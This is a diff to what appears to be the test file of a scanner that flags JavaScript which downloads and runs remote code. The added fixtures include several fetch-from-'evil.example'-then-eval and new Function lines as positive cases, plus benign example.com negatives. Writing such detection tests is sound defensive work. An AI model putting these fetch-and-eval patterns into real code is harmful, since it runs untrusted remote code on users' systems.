@@ -29,6 +29,14 @@ const CHAINED: Record<string, string> = {
     "fetch('https://evil.example/x.js')\n  .then((res) => res.text())\n  .then((code) => eval(code));\n",
   "the fetched text run through the Function constructor":
     "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => new Function(t)())\n",
+  "a function-expression callback evaluating its parameter":
+    "fetch('https://evil.example/x.js').then((r) => r.text()).then(function(t){ return eval(t); })\n",
+  "an async function-expression callback evaluating its parameter":
+    "fetch('https://evil.example/x.js').then((r) => r.text()).then(async function(t){ return eval(t); })\n",
+  "a named function-expression callback evaluating its parameter":
+    "fetch('https://evil.example/x.js').then((r) => r.text()).then(function load(t){ return eval(t); })\n",
+  "the fetched text as the Function constructor's body argument, invoked":
+    "fetch('https://evil.example/x.js').then((r) => r.text()).then((t) => new Function('x', t)())\n",
   "bare Function as the callback":
     "fetch('https://evil.example/x.js').then((r) => r.text()).then(Function)\n",
   "the fetched text handed to setTimeout as a string":
@@ -72,6 +80,10 @@ test("fetched data that is not executed keeps no finding", () => {
     "fetch('https://example.com/data.json').then((r) => r.json()).then(eval)\n",
     // A name that merely contains the executor's name is not the executor.
     "fetch('https://example.com/x.txt').then((r) => r.text()).then(evaluate)\n",
+    // A function-expression callback that only renders the text.
+    "fetch('https://example.com/x.txt').then((r) => r.text()).then(function(t){ return console.log(t); })\n",
+    // Constructing a Function without calling it executes nothing.
+    "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => new Function('x', t))\n",
     // setTimeout with a function wraps the text; it does not run it.
     "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => setTimeout(() => show(t), 0))\n",
   ]) {
@@ -91,6 +103,8 @@ test("a transformation or property of the fetched text stays with source review"
     "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => eval(t.length))\n",
     // The executor's argument is a literal; the text is a later argument.
     "fetch('https://example.com/x.txt').then((r) => r.text()).then((t) => new Function('x', t.length))\n",
+    // The same property boundary inside a function-expression callback.
+    "fetch('https://example.com/x.txt').then((r) => r.text()).then(function(t){ return eval(t.length); })\n",
     // An axios response object is not the response text itself.
     "axios.get('https://example.com/x.js').then((r) => eval(r.data))\n",
   ]) {
